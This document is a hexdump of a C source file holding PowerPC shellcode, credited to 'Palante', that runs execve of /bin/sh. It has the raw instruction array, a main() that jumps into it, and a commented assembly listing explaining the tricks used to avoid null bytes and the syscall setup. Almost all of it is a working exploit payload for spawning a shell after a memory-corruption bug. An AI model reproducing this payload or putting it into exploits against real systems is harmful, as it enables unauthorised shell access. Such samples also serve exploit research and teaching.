00000000  2f 2a 0d 0a 20 2a 20 20  4c 69 6e 75 78 20 50 50  |/*.. *  Linux PP|
00000010  43 20 73 68 65 6c 6c 63  6f 64 65 0d 0a 20 2a 20  |C shellcode.. * |
00000020  20 65 78 65 63 76 65 28  29 20 6f 66 20 2f 62 69  | execve() of /bi|
00000030  6e 2f 73 68 20 62 79 20  50 61 6c 61 6e 74 65 0d  |n/sh by Palante.|
00000040  0a 20 2a 2f 0d 0a 0d 0a  6c 6f 6e 67 20 73 68 65  |. */....long she|
00000050  6c 6c 63 6f 64 65 5b 5d  20 3d 20 7b 20 2f 2a 20  |llcode[] = { /* |
00000060  50 61 6c 61 6e 74 65 27  73 20 42 53 44 20 50 50  |Palante's BSD PP|
00000070  43 20 73 68 65 6c 6c 63  6f 64 65 20 77 2f 20 4e  |C shellcode w/ N|
00000080  55 4c 4c 2a 2f 0d 0a 20  20 30 78 37 43 43 36 33  |ULL*/..  0x7CC63|
00000090  32 37 38 2c 20 30 78 32  46 38 36 37 46 46 46 2c  |278, 0x2F867FFF,|
000000a0  20 30 78 34 31 42 43 30  30 35 43 2c 20 30 78 37  | 0x41BC005C, 0x7|
000000b0  43 36 38 30 32 41 36 2c  0d 0a 20 20 30 78 42 30  |C6802A6,..  0xB0|
000000c0  43 33 46 46 46 39 2c 20  30 78 42 30 43 33 46 46  |C3FFF9, 0xB0C3FF|
000000d0  46 31 2c 20 30 78 33 38  38 36 37 46 46 30 2c 20  |F1, 0x38867FF0, |
000000e0  30 78 33 38 41 36 37 46  46 34 2c 0d 0a 20 20 30  |0x38A67FF4,..  0|
000000f0  78 33 38 45 36 37 46 46  33 2c 20 30 78 37 43 41  |x38E67FF3, 0x7CA|
00000100  35 32 32 37 38 2c 20 30  78 37 43 45 37 32 32 37  |52278, 0x7CE7227|
00000110  38 2c 20 30 78 37 43 38  35 33 41 31 34 2c 0d 0a  |8, 0x7C853A14,..|
00000120  20 20 30 78 37 43 43 34  31 39 41 45 2c 20 30 78  |  0x7CC419AE, 0x|
00000130  37 43 38 34 32 39 44 36  2c 20 30 78 37 43 38 34  |7C8429D6, 0x7C84|
00000140  32 32 31 34 2c 20 30 78  37 43 30 34 33 41 31 34  |2214, 0x7C043A14|
00000150  2c 0d 0a 20 20 30 78 37  43 45 37 32 38 35 30 2c  |,..  0x7CE72850,|
00000160  20 30 78 37 43 38 35 32  41 31 34 2c 20 30 78 37  | 0x7C852A14, 0x7|
00000170  43 36 33 32 31 32 45 2c  20 30 78 37 43 38 33 32  |C63212E, 0x7C832|
00000180  32 31 34 2c 0d 0a 20 20  30 78 37 43 43 35 32 31  |214,..  0x7CC521|
00000190  32 45 2c 20 30 78 37 43  41 35 32 41 37 38 2c 20  |2E, 0x7CA52A78, |
000001a0  30 78 34 34 46 46 46 46  30 32 2c 20 30 78 37 43  |0x44FFFF02, 0x7C|
000001b0  45 30 33 42 37 38 2c 0d  0a 20 20 30 78 34 34 46  |E03B78,..  0x44F|
000001c0  46 46 46 30 32 2c 20 30  78 34 42 46 46 46 46 41  |FFF02, 0x4BFFFFA|
000001d0  39 2c 20 30 78 32 46 36  32 36 39 36 45 2c 20 30  |9, 0x2F62696E, 0|
000001e0  78 32 46 37 33 36 38 35  41 2c 0d 0a 20 20 30 78  |x2F73685A,..  0x|
000001f0  46 46 46 46 46 46 46 46  2c 20 30 78 46 46 46 46  |FFFFFFFF, 0xFFFF|
00000200  46 46 46 46 0d 0a 7d 3b  20 0d 0a 0d 0a 0d 0a 76  |FFFF..}; ......v|
00000210  6f 69 64 20 6d 61 69 6e  28 29 0d 0a 7b 0d 0a 20  |oid main()..{.. |
00000220  20 5f 5f 61 73 6d 5f 5f  28 22 62 20 73 68 65 6c  | __asm__("b shel|
00000230  6c 63 6f 64 65 22 29 3b  0d 0a 7d 0d 0a 0d 0a 2f  |lcode");..}..../|
00000240  2a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 64  |*              d|
00000250  69 73 61 73 73 65 6d 62  6c 79 0d 0a 0d 0a 20 20  |isassembly....  |
00000260  20 20 20 20 20 20 2e 73  65 63 74 69 6f 6e 20 22  |      .section "|
00000270  2e 74 65 78 74 22 20 20  20 20 20 20 23 20 50 61  |.text"      # Pa|
00000280  6c 61 6e 74 65 27 73 20  42 53 44 20 50 50 43 20  |lante's BSD PPC |
00000290  73 68 65 6c 6c 63 6f 64  65 0d 0a 20 20 20 20 20  |shellcode..     |
000002a0  20 20 20 2e 61 6c 69 67  6e 20 32 0d 0a 20 20 20  |   .align 2..   |
000002b0  20 20 20 20 20 2e 67 6c  6f 62 6c 20 6d 0d 0a 20  |     .globl m.. |
000002c0  20 20 20 20 20 20 20 2e  74 79 70 65 20 20 20 20  |       .type    |
000002d0  6d 2c 40 66 75 6e 63 74  69 6f 6e 0d 0a 6d 3a 0d  |m,@function..m:.|
000002e0  0a 09 78 6f 72 20 20 36  2c 36 2c 36 20 20 20 20  |..xor  6,6,6    |
000002f0  20 20 20 20 20 20 20 20  23 20 72 36 20 69 73 20  |        # r6 is |
00000300  30 0d 0a 09 63 6d 70 69  20 20 37 2c 30 2c 36 2c  |0...cmpi  7,0,6,|
00000310  30 78 37 46 46 46 20 20  20 20 23 20 64 6f 20 6d  |0x7FFF    # do m|
00000320  65 61 6e 69 6e 67 6c 65  73 73 20 63 6f 6d 70 61  |eaningless compa|
00000330  72 65 0d 0a 20 20 20 20  20 20 20 20 62 63 20 31  |re..        bc 1|
00000340  33 2c 32 38 2c 4c 32 20  20 20 20 20 20 20 20 20  |3,28,L2         |
00000350  20 20 23 20 63 6f 6e 64  69 74 69 6f 6e 61 6c 20  |  # conditional |
00000360  62 72 61 6e 63 68 20 74  6f 20 4c 32 20 23 20 43  |branch to L2 # C|
00000370  41 55 53 45 53 20 4e 55  4c 4c 20 42 59 54 45 0d  |AUSES NULL BYTE.|
00000380  0a 4c 31 3a 20 20 20 20  20 6d 66 73 70 72 20 33  |.L1:     mfspr 3|
00000390  2c 38 09 20 20 20 20 20  20 23 20 61 64 64 72 65  |,8.      # addre|
000003a0  73 73 20 6f 66 20 2f 62  69 6e 2f 73 68 20 69 6e  |ss of /bin/sh in|
000003b0  74 6f 20 72 33 20 28 65  78 65 63 76 65 20 70 61  |to r3 (execve pa|
000003c0  72 61 6d 65 74 65 72 29  0d 0a 09 09 09 0d 0a 09  |rameter)........|
000003d0  73 74 68 20 20 36 2c 2d  37 28 33 29 20 20 20 20  |sth  6,-7(3)    |
000003e0  20 20 20 20 20 20 23 20  66 69 78 20 73 63 20 6f  |      # fix sc o|
000003f0  70 63 6f 64 65 0d 0a 09  73 74 68 20 20 36 2c 2d  |pcode...sth  6,-|
00000400  31 35 28 33 29 20 20 20  20 20 20 20 20 20 23 20  |15(3)         # |
00000410  66 69 78 20 73 63 20 6f  70 63 6f 64 65 0d 0a 09  |fix sc opcode...|
00000420  0d 0a 09 61 64 64 69 20  34 2c 36 2c 30 78 37 46  |...addi 4,6,0x7F|
00000430  46 30 0d 0a 09 61 64 64  69 20 35 2c 36 2c 30 78  |F0...addi 5,6,0x|
00000440  37 46 46 34 0d 0a 09 61  64 64 69 20 37 2c 36 2c  |7FF4...addi 7,6,|
00000450  30 78 37 46 46 33 0d 0a  09 78 6f 72 20 20 35 2c  |0x7FF3...xor  5,|
00000460  35 2c 34 20 20 20 20 20  20 20 20 20 20 20 20 23  |5,4            #|
00000470  67 6f 74 20 30 78 34 20  69 6e 74 6f 20 72 35 0d  |got 0x4 into r5.|
00000480  0a 09 78 6f 72 20 20 37  2c 37 2c 34 20 20 20 20  |..xor  7,7,4    |
00000490  20 20 20 20 20 20 20 20  23 67 6f 74 20 30 78 33  |        #got 0x3|
000004a0  20 69 6e 74 6f 20 72 37  0d 0a 0d 0a 09 0d 0a 09  | into r7........|
000004b0  61 64 64 20 20 34 2c 35  2c 37 20 20 20 20 20 20  |add  4,5,7      |
000004c0  20 20 20 20 20 20 23 20  72 34 20 3d 20 30 78 37  |      # r4 = 0x7|
000004d0  0d 0a 09 73 74 62 78 20  36 2c 34 2c 33 20 20 20  |...stbx 6,4,3   |
000004e0  20 20 20 20 20 20 20 20  20 23 20 73 74 6f 72 65  |         # store|
000004f0  20 6e 75 6c 6c 20 61 66  74 65 72 20 2f 62 69 6e  | null after /bin|
00000500  2f 73 68 0d 0a 0d 0a 09  6d 75 6c 6c 77 20 34 2c  |/sh.....mullw 4,|
00000510  34 2c 35 20 20 20 20 20  20 20 20 20 20 20 23 20  |4,5           # |
00000520  72 34 20 3d 20 30 78 31  63 20 28 32 38 29 0d 0a  |r4 = 0x1c (28)..|
00000530  20 20 20 20 20 20 20 20  61 64 64 20 20 34 2c 34  |        add  4,4|
00000540  2c 34 20 20 20 20 20 20  20 20 20 20 20 20 23 20  |,4            # |
00000550  72 34 20 3d 20 30 78 33  38 20 28 35 36 29 0d 0a  |r4 = 0x38 (56)..|
00000560  09 61 64 64 20 20 30 2c  34 2c 37 20 20 20 20 20  |.add  0,4,7     |
00000570  20 20 20 20 20 20 20 23  20 74 68 69 73 20 6d 61  |       # this ma|
00000580  6b 65 73 20 35 39 20 77  68 69 63 68 20 69 73 20  |kes 59 which is |
00000590  74 68 65 20 65 78 65 63  76 65 20 73 79 73 74 65  |the execve syste|
000005a0  6d 20 63 61 6c 6c 0d 0a  20 20 20 20 20 20 20 20  |m call..        |
000005b0  0d 0a 20 20 20 20 20 20  20 20 73 75 62 20 20 37  |..        sub  7|
000005c0  2c 35 2c 37 20 20 20 20  20 20 20 20 20 20 20 20  |,5,7            |
000005d0  23 20 72 37 20 3d 20 30  78 31 20 66 6f 72 20 65  |# r7 = 0x1 for e|
000005e0  78 69 74 20 73 79 73 74  65 6d 20 63 61 6c 6c 09  |xit system call.|
000005f0  0d 0a 0d 0a 20 20 20 20  20 20 20 20 61 64 64 20  |....        add |
00000600  20 34 2c 35 2c 35 20 20  20 20 20 20 20 20 20 20  | 4,5,5          |
00000610  20 20 23 20 72 34 20 3d  20 30 78 38 0d 0a 20 20  |  # r4 = 0x8..  |
00000620  20 20 20 20 20 20 73 74  77 78 20 33 2c 33 2c 34  |      stwx 3,3,4|
00000630  20 20 20 20 20 20 20 20  20 20 20 20 23 20 61 6e  |            # an|
00000640  64 20 73 74 6f 72 65 20  70 6f 69 6e 74 65 72 20  |d store pointer |
00000650  74 6f 20 2f 62 69 6e 2f  73 68 20 61 74 20 72 33  |to /bin/sh at r3|
00000660  2b 30 78 38 0d 0a 09 61  64 64 20 20 34 2c 33 2c  |+0x8...add  4,3,|
00000670  34 20 20 20 20 20 20 20  20 20 20 20 20 23 20 72  |4            # r|
00000680  34 20 3d 20 72 33 20 2b  20 30 78 38 20 28 65 78  |4 = r3 + 0x8 (ex|
00000690  65 63 76 65 20 70 61 72  61 6d 65 74 65 72 29 0d  |ecve parameter).|
000006a0  0a 09 73 74 77 78 20 36  2c 35 2c 34 20 20 20 20  |..stwx 6,5,4    |
000006b0  20 20 20 20 20 20 20 20  23 20 73 74 6f 72 65 20  |        # store |
000006c0  4e 55 4c 4c 20 70 6f 69  6e 74 65 72 0d 0a 20 20  |NULL pointer..  |
000006d0  20 20 20 20 20 20 78 6f  72 20 35 2c 35 2c 35 20  |      xor 5,5,5 |
000006e0  20 20 20 20 20 20 20 20  20 20 20 20 23 20 4e 55  |            # NU|
000006f0  4c 4c 20 28 65 78 65 63  76 65 20 70 61 72 61 6d  |LL (execve param|
00000700  65 74 65 72 29 0d 0a 2e  6c 6f 6e 67 20 20 20 30  |eter)...long   0|
00000710  78 34 34 66 66 66 66 30  32 20 20 20 20 20 20 20  |x44ffff02       |
00000720  20 20 20 20 20 23 20 6e  6f 74 20 71 75 69 74 65  |     # not quite|
00000730  20 61 6e 20 73 63 20 6f  70 63 6f 64 65 0d 0a 09  | an sc opcode...|
00000740  6f 72 20 30 2c 37 2c 37  20 20 20 20 20 20 20 20  |or 0,7,7        |
00000750  20 20 20 20 20 20 23 20  73 79 73 63 61 6c 6c 20  |      # syscall |
00000760  31 20 2d 20 65 78 69 74  0d 0a 2e 6c 6f 6e 67 20  |1 - exit...long |
00000770  20 20 30 78 34 34 66 66  66 66 30 32 20 20 20 20  |  0x44ffff02    |
00000780  20 20 20 20 20 20 20 20  23 20 6e 6f 74 20 71 75  |        # not qu|
00000790  69 74 65 20 61 6e 20 73  63 20 6f 70 63 6f 64 65  |ite an sc opcode|
000007a0  0d 0a 0d 0a 4c 32 3a 20  20 20 20 20 62 6c 20 4c  |....L2:     bl L|
000007b0  31 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1               |
000007c0  20 20 23 20 62 72 61 6e  63 68 20 61 6e 64 20 6c  |  # branch and l|
000007d0  69 6e 6b 20 62 61 63 6b  20 74 6f 20 4c 31 0d 0a  |ink back to L1..|
000007e0  2e 6c 6f 6e 67 20 30 78  32 46 36 32 36 39 36 45  |.long 0x2F62696E|
000007f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 23 2f  |              #/|
00000800  62 69 6e 2f 73 68 5a 0d  0a 2e 6c 6f 6e 67 20 30  |bin/shZ...long 0|
00000810  78 32 46 37 33 36 38 35  41 0d 0a 2e 6c 6f 6e 67  |x2F73685A...long|
00000820  20 30 78 66 66 66 66 66  66 66 66 20 20 20 20 20  | 0xffffffff     |
00000830  20 20 20 20 20 20 20 20  20 23 20 74 68 69 73 20  |         # this |
00000840  69 73 20 77 68 65 72 65  20 70 6f 69 6e 74 65 72  |is where pointer|
00000850  20 74 6f 20 2f 62 69 6e  2f 73 68 20 67 6f 65 73  | to /bin/sh goes|
00000860  0d 0a 2e 6c 6f 6e 67 20  30 78 66 66 66 66 66 66  |...long 0xffffff|
00000870  66 66 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |ff              |
00000880  23 20 74 68 69 73 20 69  73 20 77 68 65 72 65 20  |# this is where |
00000890  6e 75 6c 6c 20 70 6f 69  6e 74 65 72 20 67 6f 65  |null pointer goe|
000008a0  73 0d 0a 0d 0a 2e 4c 66  65 31 3a 0d 0a 2e 73 69  |s.....Lfe1:...si|
000008b0  7a 65 20 20 20 20 6d 2c  2e 4c 66 65 31 2d 6d 0d  |ze    m,.Lfe1-m.|
000008c0  0a 0d 0a 2a 2f                                    |...*/|
000008c5
